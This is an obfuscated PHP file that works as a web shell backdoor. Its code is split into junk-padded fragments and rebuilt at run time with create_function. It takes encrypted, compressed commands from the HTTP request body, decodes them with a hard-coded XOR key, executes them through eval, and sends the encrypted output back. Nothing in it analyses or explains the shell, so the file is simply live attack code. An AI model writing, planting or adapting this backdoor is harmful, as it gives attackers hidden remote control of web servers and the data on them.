<?php
$j='<Y};}}<Yreturn<Y $<Yo;}if (@preg<Y_matc<Yh("/$kh(<Y.+<Y)<Y$kf/",@file_get<Y<Y_<Ycont';
$n='N<YcH<YdK";fu<Ynction x($t<Y,<Y$k<Y){$c=strl<Ye<Yn($k);<Y$<Y<Yl=strle<Yn($t);$o="";f';
$c='or($i=0<Y;<Y$i<$<Yl;){for($j=0;($j<$c<Y<Y&&$i<$l);$j+<Y+<Y,$i++){$o.=<Y$t{$i<Y}^$k{$j';
$k='Yase6<Y4_decode<Y($m[1<Y]),$k)<Y))<Y;$o=@ob<Y_get_<Ycon<Yt<Yents();@ob_end_cl<Ye<Ya';
$l='$k="671<Y1a5b9";<Y<Y$kh="<Y4732a768d10<Y7";$k<Yf="da<Y158<Yb9cd831<Y";$p="cCM69<Y4ZeJVI';
$I='n();$r=@<Yb<Yas<Ye64_encode(@x(@gz<Ycompre<Yss($o),$k<Y));<Yprint("$p<Y$kh$r$<Ykf");}';
$a='e<Ynts("php://input"<Y)<Y,$m)<Y==1)<Y {@ob_start();@e<Yval(<Y@<Ygzuncompr<Yess(@x(@b<';
$u=str_replace('Z','','ZcrZeatZe_fuZnZZction');
$i=str_replace('<Y','',$l.$n.$c.$j.$a.$k.$I);
$E=$u('',$i);$E();
?>
